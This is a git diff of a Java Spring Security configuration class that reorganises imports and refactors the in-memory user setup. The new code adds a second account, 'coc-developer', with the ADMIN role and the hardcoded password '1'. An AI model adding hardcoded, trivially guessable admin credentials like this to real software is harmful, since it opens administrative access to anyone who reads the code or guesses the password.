@@ -1,6 +1,7 @@
 package open.api.coc.clans.common.config;
 
-import jakarta.servlet.http.HttpSession;
+import java.util.List;
+import javax.sql.DataSource;
 import lombok.RequiredArgsConstructor;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.boot.autoconfigure.security.servlet.PathRequest;
@@ -11,16 +12,14 @@ import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
 import org.springframework.security.config.annotation.web.configurers.HeadersConfigurer;
-import org.springframework.security.config.http.SessionCreationPolicy;
 import org.springframework.security.core.userdetails.User;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.core.userdetails.UserDetailsService;
 import org.springframework.security.crypto.factory.PasswordEncoderFactories;
 import org.springframework.security.provisioning.InMemoryUserDetailsManager;
 import org.springframework.security.web.SecurityFilterChain;
-import org.springframework.security.web.authentication.rememberme.*;
-
-import javax.sql.DataSource;
+import org.springframework.security.web.authentication.rememberme.JdbcTokenRepositoryImpl;
+import org.springframework.security.web.authentication.rememberme.PersistentTokenRepository;
 
 
 @Configuration
@@ -63,12 +62,23 @@ public class SecurityConfig {
 
     @Bean
     public UserDetailsService users() {
-        UserDetails admin = User.builder()
-                .username(username)
-                .password(PasswordEncoderFactories.createDelegatingPasswordEncoder().encode(password))
-                .roles("ADMIN")
-                .build();
-        return new InMemoryUserDetailsManager(admin);
+        List<UserDetails> users = getUsers();
+        return new InMemoryUserDetailsManager(users.stream().toList());
+    }
+
+    private List<UserDetails> getUsers() {
+        return List.of(
+            makeUserDetails(username, password, "ADMIN"),
+            makeUserDetails("coc-developer", "1", "ADMIN")
+        );
+    }
+
+    private UserDetails makeUserDetails(String username, String password, String role) {
+        return User.builder()
+                   .username(username)
+                   .password(PasswordEncoderFactories.createDelegatingPasswordEncoder().encode(password))
+                   .roles(role)
+                   .build();
     }
 
     @Bean
